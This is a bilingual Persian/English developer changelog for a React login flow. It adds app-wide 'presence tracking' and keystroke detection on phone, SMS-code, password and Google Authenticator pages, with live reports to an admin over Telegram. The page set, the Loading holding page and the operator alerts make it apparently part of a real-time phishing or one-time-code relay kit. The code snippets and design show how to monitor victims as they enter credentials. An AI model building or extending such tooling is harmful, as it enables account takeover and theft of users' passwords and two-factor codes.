# رفع مشکل ردیابی حضور در تمام صفحات

# Global Presence Tracking Fix

## مشکل گزارش شده / Reported Issue

**مشکل**: وضعیت آنلاین/آفلاین کاربر فقط در صفحه اول (LoginForm) به درستی کار می‌کرد. وقتی کاربر وارد فرم‌های دیگر مثل Loading، AuthSMS، AuthPassword می‌شد، سیستم حضور قطع می‌شد.

**Problem**: User online/offline status only worked correctly on the first page (LoginForm). When user navigated to other forms like Loading, AuthSMS, AuthPassword, the presence system would stop working.

## تحلیل ریشه مشکل / Root Cause Analysis

### مشکلات شناسایی شده:

1. **ردیابی محلی**: سیستم حضور فقط در `LoginForm` فعال بود
2. **قطع در انتقال**: هنگام تغییر صفحه، سیستم cleanup می‌شد
3. **عدم ادامه session**: `sessionId` در صفحات دیگر پردازش نمی‌شد
4. **فقدان ردیابی global**: هر صفحه باید سیستم حضور جداگانه‌ای داشت

## راه‌حل پیاده‌سازی شده / Implemented Solution

### 1. ایجاد Global Presence Provider

#### فایل جدید: `src/components/GlobalPresenceProvider.tsx`

**ویژگی‌های اصلی**:

- ✅ ردیابی حضور در سطح کل اپلیکیشن
- ✅ تشخیص خودکار صفحه فعلی بر اساس URL routing
- ✅ مدیریت مشترک `sessionId` در تمام صفحات
- ✅ نظارت بر تغییرات session و به‌روزرسانی خودکار

**نقشه مسیرها**:

```typescript
const pathMap: Record<string, string> = {
  "/": "LoginForm",
  "/loading": "Loading",
  "/auth-sms": "AuthSMS",
  "/auth-password": "AuthPassword",
  "/auth-google": "AuthGoogle",
  "/auth-email": "AuthEmail",
  "/phone-verification": "PhoneVerification",
  "/debug": "Debug",
};
```

### 2. به‌روزرسانی App.tsx

#### تغییرات:

- ✅ افزودن تمام routes مربوط به احراز هویت
- ✅ Wrap کردن تمام routes با `GlobalPresenceProvider`
- ✅ اطمینان از ردیابی مستمر حضور

```typescript
// قبل: فقط Index route
<Routes>
  <Route path="/" element={<Index />} />
  <Route path="/debug" element={<Debug />} />
  <Route path="*" element={<NotFound />} />
</Routes>

// بعد: تمام routes با Global Presence
<GlobalPresenceProvider>
  <Routes>
    <Route path="/" element={<Index />} />
    <Route path="/loading" element={<Loading />} />
    <Route path="/auth-sms" element={<AuthSMS />} />
    <Route path="/auth-password" element={<AuthPassword />} />
    <Route path="/auth-google" element={<AuthGoogle />} />
    <Route path="/auth-email" element={<AuthEmail />} />
    <Route path="/phone-verification" element={<PhoneVerification />} />
    <Route path="/debug" element={<Debug />} />
    <Route path="*" element={<NotFound />} />
  </Routes>
</GlobalPresenceProvider>
```

### 3. ایجاد Simple Typing Detection Hook

#### فایل جدید: `src/hooks/useSimpleTypingDetection.ts`

**هدف**: ارائه تشخیص تایپ ساده برای هر صفحه بدون پیچیدگی اضافی

**ویژگی‌ها**:

- ✅ تشخیص تایپ بر اساس فیلدهای مشخص شده
- ✅ Debouncing قابل تنظیم برای هر صفحه
- ✅ Event handlers آماده برای افزودن به input ها
- ✅ Cleanup خودکار هنگام تغییر صفحه

**استفاده**:

```typescript
const typingDetection = useSimpleTypingDetection({
  formName: "AuthPassword",
  enabledFields: ["password"],
  debounceTime: 1500,
});

// در JSX:
<Input
  {...typingDetection.createTypingHandler("password")}
  // بقیه props
/>
```

### 4. به‌روزرسانی همه صفحات

#### صفحات به‌روزرسانی شده:

1. **LoginForm** (`src/components/LoginForm.tsx`):

   - ❌ حذف `useCompletePresence` محلی
   - ✅ افزودن `useSimpleTypingDetection`
   - ✅ اتصال به فیلد شماره تلفن

2. **AuthSMS** (`src/pages/AuthSMS.tsx`):

   - ❌ حذف `usePresence` محلی
   - ✅ افزودن `useSimpleTypingDetection`
   - ✅ تنظیم برای فیلدهای کد SMS

3. **AuthPassword** (`src/pages/AuthPassword.tsx`):

   - ✅ افزودن `useSimpleTypingDetection`
   - ✅ اتصال به فیلد رمز عبور

4. **AuthGoogle** (`src/pages/AuthGoogle.tsx`):

   - ✅ افزودن `useSimpleTypingDetection`
   - ✅ تنظیم برای فیلد Google Authenticator

5. **Loading** (`src/pages/Loading.tsx`):
   - ✅ افزودن ردیابی حضور ساده (بدون فیلد تایپ)

## نحوه کارکرد جدید / How It Works Now

### 1. شروع جلسه در LoginForm

```
کاربر → LoginForm → sessionId ایجاد می‌شود
                 ↓
      GlobalPresenceProvider تشخیص می‌دهد
                 ↓
      initialize(sessionId) اجرا می‌شود
                 ↓
      ردیابی حضور شروع می‌شود ✅
```

### 2. انتقال به صفحات دیگر

```
کاربر → navigate("/loading") → URL تغییر می‌کند
                              ↓
      GlobalPresenceProvider تشخیص می‌دهد
                              ↓
      setCurrentForm("Loading") اجرا می‌شود
                              ↓
      ردیابی ادامه می‌یابد ✅
```

### 3. ردیابی تایپ در هر صفحه

```
کاربر در فیلد تایپ می‌کند → useSimpleTypingDetection تشخیص می‌دهد
                            ↓
      globalPresenceManager.startTyping() اجرا می‌شود
                            ↓
      پیام به ادمین تلگرام ارسال می‌شود ✅
```

## مزایای سیستم جدید / New System Benefits

### عملکرد:

- ✅ **پایداری کامل**: حضور در تمام صفحات ردیابی می‌شود
- ✅ **عدم قطعی**: انتقال بین صفحات سیستم را مختل نمی‌کند
- ✅ **مدیریت هوشمند session**: تشخیص خودکار تغییرات sessionId

### امنیت:

- ✅ **ردیابی مستمر**: هیچ gap در ردیابی حضور وجود ندارد
- ✅ **تایپ دقیق**: تشخیص تایپ در تمام فیلدهای مهم
- ✅ **فقط برای ادمین**: اطلاعات فقط به ادمین تلگرام ارسال می‌شود

### قابلیت نگهداری:

- ✅ **سازماندهی بهتر**: جدایی concerns در لایه‌های مختلف
- ✅ **قابلیت گسترش**: آسان بودن افزودن صفحات جدید
- ✅ **Debug آسان**: نمایشگر وضعیت در development mode

## نظارت و دیباگ / Monitoring & Debug

### نمایشگر Development:

در حالت development، نمایشگر کوچکی در گوشه صفحه نمایش داده می‌شود:

```
🌍 LoginForm | online | ⌨️
🌍 Loading | idle | 💤
🌍 AuthPassword | online | ⌨️
```

### لاگ‌های کنسول:

```
🌍 [GLOBAL PRESENCE] مقداردهی اولیه برای جلسه: abc12345
✅ [GLOBAL PRESENCE] سیستم سراسری راه‌اندازی شد
🌍 [GLOBAL PRESENCE] تغییر صفحه: Loading
⌨️ [AuthPassword] شروع تایپ در فیلد: password
✅ [STATUS MANAGER] وضعیت ادمین با موفقیت ارسال شد
```

## تست و تأیید / Testing & Verification

### مراحل تست:

1. ✅ شروع در LoginForm - حضور ردیابی می‌شود
2. ✅ انتقال به Loading - حضور ادامه دارد
3. ✅ انتقال به AuthSMS - حضور ادامه دارد
4. ✅ تایپ در فیلد SMS - تشخیص داده می‌شود
5. ✅ انتقال به AuthPassword - حضور ادامه دارد
6. ✅ تایپ در فیلد Password - تشخیص داده می‌شود

### فرمت پیام ادمین:

```
🟢 آنلاین
⌨️ در حال تایپ در: AuthPassword (password)
🔗 Session: abc12345
```

## خلاصه تغییرات / Summary of Changes

### فایل‌های جدید:

- ✅ `src/components/GlobalPresenceProvider.tsx`
- ✅ `src/hooks/useSimpleTypingDetection.ts`
- ✅ `GLOBAL_PRESENCE_TRACKING_FIX.md`

### فایل‌های به‌روزرسانی شده:

- ✅ `src/App.tsx` - افزودن Global Provider و routes
- ✅ `src/components/LoginForm.tsx` - حذف presence محلی، افزودن typing detection
- ✅ `src/pages/AuthSMS.tsx` - افزودن typing detection
- ✅ `src/pages/AuthPassword.tsx` - افزودن typing detection
- ✅ `src/pages/AuthGoogle.tsx` - افزودن typing detection
- ✅ `src/pages/Loading.tsx` - افزودن ردیابی ساده

### نتیجه نهایی:

✅ **مشکل حل شد**: حالا ردیابی حضور در تمام صفحات کار می‌کند
✅ **تایپ شناسایی می‌شود**: در تمام فیلدهای مهم
✅ **ادمین اطلاع می‌یابد**: از تمام فعالیت‌های کاربر در تلگرام
✅ **سیستم پایدار است**: بدون قطعی در انتقال بین صفحات
